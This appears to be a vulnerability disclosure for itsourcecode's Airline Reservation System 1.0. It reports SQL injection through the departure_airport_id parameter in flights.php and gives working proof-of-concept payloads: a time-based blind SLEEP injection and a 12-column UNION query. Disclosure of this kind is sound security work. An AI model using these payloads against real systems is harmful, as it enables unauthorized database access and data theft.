# Vendor

itsourcecode

# Product

Airline Reservation System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/03/Airline-Reservation-System-PHP-Project-Source-Code.zip

# Vulnerabilities

SQLi

# Description

In the flights. php page, the occurrence of SQLi injection is due to insufficient filtering of the departure_airport_id parameter.
<img width="1471" alt="image" src="https://github.com/user-attachments/assets/362553a3-ff75-4d57-8660-0b1696b0caf7">

# Poc
```
Parameter: departure_airport_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: departure_airport_id=4' AND (SELECT 5140 FROM (SELECT(SLEEP(5)))gVLv) AND 'NWps'='NWps&arrival_airport_id=4&date=&date_return=&trip=1

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: departure_airport_id=4' UNION ALL SELECT CONCAT(0x7176767071,0x424b506d6250536942685a4254456d74566f536244496e6351716f4a6974504149794b5370625a54,0x71767a7a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&arrival_airport_id=4&date=&date_return=&trip=1
```
